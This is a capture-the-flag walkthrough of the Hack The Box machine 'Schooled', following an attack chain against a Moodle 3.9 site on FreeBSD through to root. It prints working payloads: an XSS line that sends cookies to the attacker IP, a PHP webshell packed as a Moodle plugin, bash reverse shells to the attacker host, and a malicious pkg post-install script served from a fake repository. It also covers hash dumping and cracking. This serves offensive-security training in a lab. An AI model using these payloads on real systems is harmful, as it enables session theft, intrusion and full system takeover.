# Hack The Box: Schooled — Comprehensive Step-by-Step Walkthrough

**Target IP:** `10.129.96.53`  
**Attacker IP (Kali):** `10.10.16.84`  
**OS:** FreeBSD 13.0-BETA3  
**Difficulty:** Medium  

---

## Table of Contents
1. [Executive Summary](#executive-summary)
2. [Phase 1: Reconnaissance & Enumeration](#phase-1-reconnaissance--enumeration)
3. [Phase 2: Initial Foothold via Moodle](#phase-2-initial-foothold-via-moodle)
4. [Phase 3: From www to Jamie (User Flag)](#phase-3-from-www-to-jamie-user-flag)
5. [Phase 4: From Jamie to Root (Root Flag)](#phase-4-from-jamie-to-root-root-flag)
6. [Key Takeaways & Hacker Mindset](#key-takeaways--hacker-mindset)

---

## Executive Summary

Schooled is a **FreeBSD** machine running an **Apache/PHP** web server with a **Moodle 3.9** learning management system. The attack path follows a classic "escalation of privileges within an application" pattern:

1. **External Recon** → Discover a Moodle subdomain
2. **Application Recon** → Register as a student, find XSS, steal a teacher's cookie
3. **Application PrivEsc** → Abuse a Moodle enrollment vulnerability (CVE-2020-14321) to promote a teacher to Manager
4. **Manager PrivEsc** → Tamper with role permissions to gain plugin upload rights
5. **Code Execution** → Upload a malicious Moodle plugin → reverse shell as `www`
6. **Lateral Movement** → Extract MySQL credentials from `config.php`, dump password hashes, crack Jamie's bcrypt hash
7. **SSH Access** → Log in as `jamie`, grab user flag
8. **Privilege Escalation** → Abuse `sudo pkg update/install *` + writable `/etc/hosts` to serve a malicious FreeBSD package
9. **Root** → Install the malicious package, get a root shell, grab root flag

---

## Phase 1: Reconnaissance & Enumeration

### Step 1.1: Update `/etc/hosts`

**Command:**
```bash
sudo bash -c 'echo "10.129.96.53 schooled.htb moodle.schooled.htb student.schooled.htb devops.htb" >> /etc/hosts'
```

**Why this matters:**  
When you visit a website by IP address, the server's virtual host configuration often routes you to a default page. Many web applications rely on the `Host:` header to serve the correct content. If you don't map the domain names to the IP, you might miss entire applications or subdomains. Additionally, if the application generates absolute URLs (e.g., redirects to `schooled.htb`), your browser needs to resolve that name.

**Hacker Mindset:**  
> *"Always assume the target has multiple personalities. The IP is just the building; the Hostname is the specific apartment. If you only knock on the building's front door, you might never find the back entrance."*

---

### Step 1.2: Nmap Scan

**Command:**
```bash
nmap -sC -sV -p- --min-rate 10000 10.129.96.53 -oA schooled_nmap
```

**Results:**
- `22/tcp` — OpenSSH 7.9 (FreeBSD)
- `80/tcp` — Apache 2.4.46 (FreeBSD) PHP/7.4.15
- `33060/tcp` — MySQL X protocol listener

**Why this matters:**  
The open ports tell us the attack surface. Port 22 means we might eventually get SSH access. Port 80 is our initial entry point. Port 33060 confirms MySQL is running (likely backing the web app). The `FreeBSD` OS is critical information for later — we can't use Linux privilege escalation techniques; we need FreeBSD-specific ones.

**Hacker Mindset:**  
> *"Every open port is a conversation waiting to happen. My job is to learn the language each port speaks. The OS banner (`FreeBSD`) isn't just trivia — it's the rulebook for the entire endgame."*

---

### Step 1.3: VHost Brute Force

**Command:**
```bash
wfuzz -u http://10.129.96.53 -H "Host: FUZZ.schooled.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hh 20750
```

**Result:** `moodle` subdomain found (response 200, different size).

**Why this matters:**  
Modern web infrastructure often hosts multiple applications on the same IP address. The main site (`schooled.htb`) might be a static marketing page, while `moodle.schooled.htb` is a fully functional application with authentication, file uploads, and a database backend. Missing the subdomain means missing the entire attack surface.

**Hacker Mindset:**  
> *"Never trust the homepage. The real treasure is usually buried in subdomains, API endpoints, or alternate vhosts. Think of the main site as the lobby — the action is in the back offices."*

---

### Step 1.4: Explore Moodle

**URL:** `http://moodle.schooled.htb`

**Observations:**
- Moodle 3.9 instance
- Teachers page at `/teachers.html` lists staff members
- Registration is open but requires `@student.schooled.htb` email
- Mathematics course offers "self enrollment"

**Why this matters:**  
Moodle is a complex PHP application with a history of vulnerabilities. Knowing the version (3.9) allows us to search for CVEs specific to that version. The self-enrollment feature means we can get a legitimate account inside the application. The teachers page gives us targets for social engineering or automated exploitation.

**Hacker Mindset:**  
> *"Enumerate first, exploit second. Before I throw exploits, I need to understand the application's normal behavior. Who are the users? What can they do? Where are the trust boundaries? Every course, every role, every announcement is a clue."*

---

## Phase 2: Initial Foothold via Moodle

### Step 2.1: Register a Student Account

**Account Details:**
- Username: `hacker`
- Email: `hacker@student.schooled.htb`
- Password: `[anything]`

**Why this matters:**  
You need an authenticated session to interact with Moodle's features. The email restriction (`@student.schooled.htb`) is a client-side or simple server-side check. Since we control the DNS resolution and the domain isn't actually sending emails, we can use any fake address. The "confirm email" link is displayed on-screen after registration — no actual email verification occurs.

**Hacker Mindset:**  
> *"Authentication mechanisms are often theater. An email verification that displays the confirmation link on the same page is just a speed bump, not a wall. Always test the boundaries of 'required' fields."*

---

### Step 2.2: Enroll in Mathematics

**Path:** Mathematics → Enrol me in this course

**Why this matters:**  
The Mathematics course has an "Announcements" forum. One announcement states that all students must have a MoodleNet profile. This is a **hint** — the teacher (Manuel Phillips) will likely check student profiles. If we can inject malicious content into our profile, we can attack whoever views it (stored XSS).

**Hacker Mindset:**  
> *"Read everything. CTF boxes often litter hints in 'announcements' or error messages. When a machine tells you 'the teacher checks profiles,' it's not flavor text — it's a roadmap to exploitation."*

---

### Step 2.3: Steal Manuel's Cookie via Stored XSS (CVE-2020-25627)

**Vulnerability:** Stored XSS via `moodlenetprofile` parameter  
**CVE:** CVE-2020-25627 / MSA-20-0011

**Payload placed in "MoodleNet profile" field:**
```html
<img src=x onerror="this.src='http://10.10.16.84/?c='+document.cookie; this.removeAttribute('onerror');">
```

**Listener on Kali:**
```bash
sudo python3 -m http.server 80
```

**Result:** After ~1-2 minutes, the target IP (`10.129.96.53`) makes a request to your Kali box:
```
10.129.96.53 - - [29/May/2026 07:54:01] "GET /?c=MoodleSession=cv3ku6rsh04qki4bjonf9fffkk HTTP/1.1" 200 -
```

**Why this matters:**  
This is a **stored XSS** triggered by an automated user (Manuel Phillips, the Mathematics teacher). The MoodleNet profile field doesn't properly sanitize HTML/JS input. When Manuel views your profile, his browser executes the JavaScript, which exfiltrates his session cookie to your attacker server. With his session cookie, you become him.

**Hacker Mindset:**  
> *"Automated users are gold. If the box hints that 'someone checks profiles,' that's not a person — it's a bot. A bot with a browser is a bot that can run your JavaScript. XSS isn't just about popping alerts; it's about stealing session tokens and becoming the victim."*

---

### Step 2.4: Become Manuel Phillips

**In Browser (Developer Tools → Storage → Cookies):**
- Replace your `MoodleSession` cookie with the stolen one
- Refresh `http://moodle.schooled.htb`

**Verification:** Top-right corner shows "Manuel Phillips".

**Why this matters:**  
Session cookies are the keys to the kingdom. In web applications, the cookie is often the only thing standing between an attacker and the victim's account. By swapping cookies, we completely bypass authentication — no password cracking, no phishing, just pure session hijacking.

**Hacker Mindset:**  
> *"Passwords are hard. Cookies are easy. If you can steal a session token, you ARE the user. Always look for ways to become someone else without ever touching a password field."*

---

### Step 2.5: Privilege Escalation to Manager (CVE-2020-14321)

**Vulnerability:** Course enrolments allowed privilege escalation from teacher role into manager role  
**CVE:** CVE-2020-14321 / MSA-20-0009

**The Problem:**  
Manuel is a **Teacher** in the Math course. Teachers can enroll users, but they shouldn't be able to assign the **Manager** role. The enrollment AJAX request sends `roletoassign=5` (Student) by default. If we intercept the request and change it to `roletoassign=1` (Manager), the server accepts it without proper authorization checks.

**Step-by-Step:**
1. Go to Mathematics → Participants → Enrol users
2. In the popup, type "Lianne Carter" (she's already a Manager at the site level)
3. Turn on Burp Intercept
4. Click "Enrol users"
5. **Modify the intercepted GET request:**
   - Change `userlist%5B%5D=25` (Lianne) → `userlist%5B%5D=24` (Manuel)
   - Change `roletoassign=5` → `roletoassign=1`
6. Forward the request
7. Manuel now has the **Manager** role in the Math course

**But wait — there's a cron job** that resets the class list every ~1 minute. If Manuel loses Manager, re-send the request from Burp Repeater.

**Why this matters:**  
This is a **horizontal privilege escalation** within the application. We're not exploiting a memory corruption bug; we're abusing a business logic flaw. The server trusts the client to send a valid `roletoassign` value and doesn't verify that the requesting user (a Teacher) is authorized to assign Manager roles.

**Hacker Mindset:**  
> *"Never trust the client, but always test if the server does. Dropdown menus that say 'Student' are just suggestions. If the server receives a '1' instead of a '5,' will it complain? Often, the answer is no. Business logic bugs are invisible to scanners but devastating in practice."*

---

### Step 2.6: Enroll Lianne Carter as Manager

**Repeat the same request but with `userlist%5B%5D=25` (Lianne) and `roletoassign=1`.**

**Why this matters:**  
With **both** Manuel and Lianne as Managers in the Math course, you can click on Lianne's profile and see a **"Log in as"** link. This allows you to impersonate Lianne Carter, who is already a Manager at the site level. This is critical because site-level Managers have access to Site Administration, which is our path to plugin installation.

**Hacker Mindset:**  
> *"Escalation is rarely a single step. It's a chain. Manuel gets Manager in the course → Lianne is already a site Manager → 'Log in as' Lianne → access Site Administration. Each link in the chain is weak alone, but together they form a bridge to the destination."*

---

### Step 2.7: Click "Log in as" Lianne Carter

**Path:** Mathematics Participants → Click Lianne Carter → "Log in as"

**Why this matters:**  
Lianne has site-wide Manager privileges. You are now effectively a Manager. However, Managers still can't install plugins by default. You need to modify the Manager role to grant full permissions.

**Hacker Mindset:**  
> *"Impersonation is a superpower. If the application lets you 'become' another user, always ask: who is the most powerful user I can become? A Manager with limited permissions is just a locked door — but who holds the key to that lock?"*

---

### Step 2.8: Enable Full Manager Permissions

**Path:** Site administration → Users → Permissions → Define roles → Manager → Edit

**The Trick:**  
The Manager role has thousands of checkboxes. You can't manually check them all before the page times out or the cron resets. Instead:
1. Scroll to the bottom and click **"Save changes"**
2. Intercept the POST request in Burp
3. Send to Repeater
4. Use **Find/Replace** in the request body: replace all `=0` with `=1`
5. Send the modified request

**Why this matters:**  
The Manager role is intentionally restricted from installing plugins (a security boundary). By tampering with the role-save request, we're exploiting the fact that the server accepts arbitrary permission values from the client. We're not exploiting a buffer overflow — we're simply telling the server "yes, the Manager can do everything," and the server believes us.

**Hacker Mindset:**  
> *"When you see a page with 500 checkboxes, don't check them manually — automate. The POST request that saves the role is just data. If you control the data, you control the permissions. Never do by hand what a regex can do in milliseconds."*

---

### Step 2.9: Upload Malicious Plugin → Webshell

**Create `rce.zip` on Kali:**
```bash
cd ~
mkdir -p rce/lang/en
cat > rce/version.php << 'EOF'
<?php 
$plugin->version = 2020061700;
$plugin->component = 'block_rce';
?>
EOF
cat > rce/lang/en/block_rce.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
zip -r rce.zip rce/
```

**Upload Path:** Site administration → Plugins → Install plugins → Choose `rce.zip`

**Webshell Location:**
```
http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id
```

**Why this matters:**  
Moodle plugins are ZIP files containing PHP code. When you upload a plugin, Moodle extracts it to `/moodle/blocks/rce/`. The language file (`block_rce.php`) is a PHP file that gets executed by the web server. By embedding `system($_GET['cmd'])`, we turn the language file into a web shell.

**Hacker Mindset:**  
> *"Every upload feature is a potential code execution feature. The question isn't 'Can I upload a file?' — it's 'Where does the file go, and will the server ever execute it?' If the answer is 'yes,' you have a shell. Language files, template files, and configuration files are often overlooked by developers as 'safe' because they're not 'main application code.'"*

---

### Step 2.10: Reverse Shell as www

**Listener on Kali:**
```bash
nc -lnvp 4444
```

**Trigger:**
```bash
curl -G --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.84/4444 0>&1'" http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php
```

**Upgrade the shell:**
```bash
/usr/local/bin/python3 -c 'import pty;pty.spawn("bash")'
# Ctrl+Z
stty raw -echo; fg
reset
```

**Why this matters:**  
A webshell is fine for one-off commands, but it's slow and fragile. A reverse shell gives you an interactive session where you can run complex commands, navigate the filesystem, and maintain persistence. Upgrading to a TTY shell gives you job control, command history, and proper terminal behavior.

**Hacker Mindset:**  
> *"A webshell is a postcard — slow and easily lost. A reverse shell is a phone line — real-time, interactive, and reliable. Always upgrade your shell. A PTY shell is the difference between fumbling in the dark and having the lights on."*

---

## Phase 3: From www to Jamie (User Flag)

### Step 3.1: Find Database Credentials

**File:** `/usr/local/www/apache24/data/moodle/config.php`

**Contents:**
```php
$CFG->dbtype    = 'mysqli';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'moodle';
$CFG->dbpass    = 'PlaybookMaster2020';
$CFG->prefix    = 'mdl_';
```

**Why this matters:**  
Web applications almost always store their database credentials in a configuration file. On Linux, this is typically `/var/www/html/`; on FreeBSD, it's `/usr/local/www/apache24/data/`. Finding the config file gives us direct access to the application's data layer — every user, every hash, every secret.

**Hacker Mindset:**  
> *"Config files are the diary of the application. They contain passwords, secrets, and connection strings that developers assume 'no one will ever see.' If you have shell access, always read the diary."*

---

### Step 3.2: Dump User Password Hashes

**Command:**
```bash
/usr/local/bin/mysql -u moodle -pPlaybookMaster2020 moodle
```

**Query:**
```sql
SELECT username, email, password FROM mdl_user;
```

**Key Finding:**
| username | email | password |
|----------|-------|----------|
| admin | jamie@staff.schooled.htb | `$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW` |

**Why this matters:**  
The `admin` account has an email address `jamie@staff.schooled.htb`, strongly suggesting this is Jamie's account. The password hash is `$2y$10$...`, which is **bcrypt** (mode 3200 in Hashcat). By cracking this hash, we can SSH in as Jamie.

**Hacker Mindset:**  
> *"Email addresses are identity breadcrumbs. When you see `jamie@staff.schooled.htb` attached to the admin account, you've found your target. Don't waste time cracking every hash — prioritize the ones that lead to SSH or privileged access."*

---

### Step 3.3: Crack Jamie's Hash

**Hashcat Command:**
```bash
echo 'admin:$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW' > hash.txt
hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** `!QAZ2wsx`

**Why this matters:**  
Bcrypt is slow, but if the password is in a common wordlist like `rockyou.txt`, it will eventually fall. The password `!QAZ2wsx` is a keyboard pattern (top-left column shifted) — a common weak password that humans choose because it's easy to type.

**Hacker Mindset:**  
> *"People don't choose random passwords; they choose convenient passwords. Keyboard walks (`!QAZ2wsx`, `1qaz2wsx`, `qwerty`) are devastatingly common. When you see bcrypt, don't panic — just be patient and let the wordlist do the work."*

---

### Step 3.4: SSH as Jamie & Grab User Flag

**Command:**
```bash
sshpass -p '!QAZ2wsx' ssh jamie@10.129.96.53
```

**User Flag:**
```bash
cat ~/user.txt
```

**Result:** `4d23ef7[redacted]b5e18815`

**Why this matters:**  
Now we have a stable, interactive shell as a real user (not just a web server account). User accounts have home directories, SSH keys, personal files, and often different sudo privileges than the web server user.

**Hacker Mindset:**  
> *"A web shell is temporary; an SSH session is permanent. Once you have a user's password, you've moved from 'guest' to 'resident.' Always check what the user can do — their privileges, their files, their history. Every user is a new lens into the system."*

---

## Phase 4: From Jamie to Root (Root Flag)

### Step 4.1: Enumerate sudo Privileges

**Command:**
```bash
sudo -l
```

**Result:**
```
User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
```

**Why this matters:**  
`pkg` is the FreeBSD package manager. The `*` wildcard in `pkg install *` means Jamie can install ANY package. This is dangerous because package installation scripts run as root. If we can make `pkg` install a package we control, we can execute arbitrary code as root.

**Hacker Mindset:**  
> *"Sudo is a treasure map. Every NOPASSWD entry is a potential elevator to root. When you see `pkg install *`, don't think 'package manager' — think 'arbitrary code execution as root, wrapped in a polite interface.' The wildcard `*` is the developer accidentally handing you the master key."*

---

### Step 4.2: Understand the pkg Configuration

**File:** `/etc/pkg/FreeBSD.conf`

**Contents:**
```yaml
FreeBSD: {
  url: "pkg+http://devops.htb:80/packages",
  mirror_type: "srv",
  signature_type: "none",
  fingerprints: "/usr/share/keys/pkg",
  enabled: yes
}
```

**File:** `/etc/hosts`

**Contents:**
```
192.168.1.14            devops.htb
```

**Why this matters:**  
`pkg update` fetches package metadata from `http://devops.htb/packages/`. `devops.htb` resolves to `192.168.1.14` via `/etc/hosts`. If we change `/etc/hosts` to point `devops.htb` to our Kali machine, `pkg` will fetch metadata from us instead of the real server. Since `signature_type: "none"`, there's no cryptographic verification to stop us.

**Hacker Mindset:**  
> *"Trust is a vulnerability. When a system fetches packages over HTTP with no signature verification, it's trusting the network. If you control the network (or the DNS, or the hosts file), you become the trusted source. Supply chain attacks aren't just for nation-states — they're for anyone who can edit a hosts file."*

---

### Step 4.3: Check /etc/hosts Writability

**Command:**
```bash
ls -l /etc/hosts
id
```

**Result:**
```
-rw-rw-r--  1 root  wheel  1098 Mar 17  2021 /etc/hosts
uid=1001(jamie) gid=1001(jamie) groups=1001(jamie),0(wheel)
```

**Why this matters:**  
Jamie is in the `wheel` group, and `/etc/hosts` is group-writable (`rw-rw-r--`). This means Jamie can directly modify `/etc/hosts` **without sudo**. This is the critical bridge between "pkg install as root" and "trick pkg into talking to us."

**Hacker Mindset:**  
> *"Permissions are promises. When a file is group-writable by wheel, the system is promising that wheel members are trusted to edit it. If that promise is wrong — if a low-privilege user like Jamie is in wheel — the promise becomes an exploit. Always check group memberships against file permissions."*

---

### Step 4.4: Create the Malicious FreeBSD Package

**On the target (as jamie):**
```bash
mkdir -p /tmp/root/usr/local/etc
cat > /tmp/root/+MANIFEST << 'EOF'
name: "root"
version: "1.0"
origin: sysutils/root
comment: "root"
desc: "root"
maintainer: root@schooled.htb
www: https://root.htb
prefix: /
EOF
cat > /tmp/root/+POST_INSTALL << 'EOF'
#!/bin/sh
bash -c 'bash -i >& /dev/tcp/10.10.16.84/5555 0>&1'
EOF
chmod +x /tmp/root/+POST_INSTALL
echo "# root" > /tmp/root/usr/local/etc/root.conf
echo "/usr/local/etc/root.conf" > /tmp/root/plist
cd /tmp/root
pkg create -m /tmp/root -r /tmp/root -p /tmp/root/plist -o .
```

**Why this matters:**  
FreeBSD packages (`.txz` files) are tar archives with metadata. The `+POST_INSTALL` script runs **as root** after the package files are extracted. By embedding a bash reverse shell in the post-install script, we ensure that the moment `pkg install` runs, a root shell connects back to our listener.

**Key Components:**
- `+MANIFEST` — Package metadata (name, version, origin, etc.)
- `+POST_INSTALL` — Shell script executed by pkg as root after installation
- `usr/local/etc/root.conf` — A dummy file the package "installs" (required for pkg create)
- `plist` — Lists the files the package owns

**Hacker Mindset:**  
> *"Package managers are script execution engines with extra steps. The package file is just a delivery mechanism; the real payload is the install script. If you can make root run your package manager, you can make root run your code. Always think about what runs BEFORE, DURING, and AFTER an installation."*

---

### Step 4.5: Transfer Package Files to Kali

**On the target, serve the files:**
```bash
cd /tmp/root
/usr/local/bin/python3 -m http.server 8080
```

**On Kali, download them:**
```bash
cd ~
mkdir -p packages
wget http://10.129.96.53:8080/packagesite.txz -O packages/packagesite.txz
wget http://10.129.96.53:8080/meta.conf -O packages/meta.conf
wget http://10.129.96.53:8080/meta.txz -O packages/meta.txz
wget http://10.129.96.53:8080/root-1.0.txz -O packages/root-1.0.txz
```

**On Kali, host the repo:**
```bash
cd ~
sudo python3 -m http.server 80
```

**Why this matters:**  
`pkg update` expects a specific repo structure:
- `/packages/meta.conf` — Repo configuration
- `/packages/meta.txz` — Compressed repo metadata
- `/packages/packagesite.txz` — Package catalog
- `/packages/root-1.0.txz` — The actual package file

By hosting these files from our Kali machine, we create a fake package repository that `pkg` will trust and fetch from.

**Hacker Mindset:**  
> *"If you can't exploit the application, exploit the infrastructure around it. A fake package repo is just a web server with the right files in the right places. Sometimes the easiest way to become root is to pretend to be a software vendor."*

---

### Step 4.6: Edit /etc/hosts and Install the Package

**On the target:**
```bash
cat /etc/hosts | sed 's/192.168.1.14/10.10.16.84/' > /tmp/hosts.new && cat /tmp/hosts.new > /etc/hosts
```

**Why `sed -i ''` fails on FreeBSD:**  
FreeBSD `sed` requires `-i ''` (with an empty string) for in-place editing, or it treats the next argument as a backup suffix. Even then, it tries to create a temp file in `/etc`, which isn't writable. Using `cat` and redirect is safer.

**Important:** A cron job resets `/etc/hosts` roughly every minute. You must change it and run `pkg` **immediately**.

**Run pkg:**
```bash
sudo pkg update
sudo pkg install root
```

**Why this matters:**  
`pkg update` fetches `meta.conf` and `packagesite.txz` from our Kali box (now pretending to be `devops.htb`). `pkg install root` downloads `root-1.0.txz` and executes the `+POST_INSTALL` script — **as root**.

**Hacker Mindset:**  
> *"Timing is everything. When a cron is watching a file, you don't have the luxury of caution. Chain your commands with `&&` so they execute as a single breath. Change the hosts, update the repo, install the package — boom, root. Hesitation is the enemy."*

---

### Step 4.7: Root Shell & Root Flag

**Listener on Kali:**
```bash
nc -lnvp 5555
```

**Result:**
```
connect to [10.10.16.84] from (UNKNOWN) [10.129.96.53] 50393
bash: cannot set terminal process group (7139): Can't assign requested address
bash: no job control in this shell
[root@Schooled /tmp/root]# id
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
```

**Root Flag:**
```bash
cat /root/root.txt
```

**Result:** `53fef09[redacted]be7abe21`

**Why this matters:**  
The `+POST_INSTALL` script ran as root because `sudo pkg install` spawns the pkg process with root privileges. The script's bash reverse shell inherited those privileges, giving us a root shell. We bypassed traditional privilege escalation (kernel exploits, SUID binaries) by weaponizing the package manager itself.

**Hacker Mindset:**  
> *"Root isn't always about memory corruption or kernel exploits. Sometimes root is just a script that runs at the wrong time with the wrong privileges. Package managers, update mechanisms, and installation scripts are often trusted implicitly by the OS. If you can hijack the mechanism, you don't need to break the lock — you just need to convince the system to let you in through the front door."*

---

## Key Takeaways & Hacker Mindset

### 1. Enumeration Is Exploitation
Every subdomain, every email address, every announcement, and every open port is a piece of the puzzle. The time you spend enumerating is never wasted — it defines the entire attack path.

### 2. Trust the Hints
When a box says "the teacher checks profiles," believe it. When you see `sudo pkg install *`, respect the wildcard. Developers and CTF creators leave breadcrumbs intentionally.

### 3. Chain Your Exploits
Rarely does one vulnerability give you everything. Schooled required: XSS → Cookie Theft → Role Escalation → Permission Tampering → Plugin Upload → Webshell → Database Access → Hash Cracking → SSH → Package Manager Abuse → Root. Each step was small; the chain was devastating.

### 4. Abuse Business Logic
Not all bugs are buffer overflows. CVE-2020-14321 was a business logic flaw: a teacher could assign a Manager role because the server didn't validate the request. These bugs are invisible to automated scanners but are often more reliable than memory corruption.

### 5. Weaponize Legitimate Features
Package managers exist to install software. When you can control what they install, they become remote code execution engines. Always ask: "What trusted mechanism can I trick into running my code?"

### 6. Time Your Moves
When cron jobs reset state (class enrollments, plugins, `/etc/hosts`), speed becomes a weapon. Chain commands with `&&`, use Repeater for rapid-fire requests, and don't wait for page refreshes — act on the backend state, not the frontend display.

### 7. OS Matters
FreeBSD isn't Linux. Python lives at `/usr/local/bin/python3`. The web root is `/usr/local/www/apache24/data/`. `sed` behaves differently. If you treat FreeBSD like Linux, you'll fail. Always adapt your tooling to the target's dialect.

---

## Full Flag Summary

| Flag | Value |
|------|-------|
| **user.txt** | `4d23ef7[redacted]5e18815` |
| **root.txt** | `53fef0[redacted]3be7abe21` |

---

*Happy Hacking!* 🏴‍☠️
